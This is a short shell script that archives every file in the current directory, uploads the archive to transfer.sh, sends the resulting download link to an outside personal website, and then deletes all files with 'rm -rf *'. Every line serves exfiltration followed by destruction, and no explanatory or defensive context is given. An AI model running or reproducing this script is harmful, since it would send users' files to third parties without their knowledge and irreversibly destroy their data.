rm -rf mk.sh
zip  file.zip *
curl --upload-file file.zip  https://transfer.sh >> link.sh
curl --upload-file link.sh http://mariongeiger.com
rm -rf *
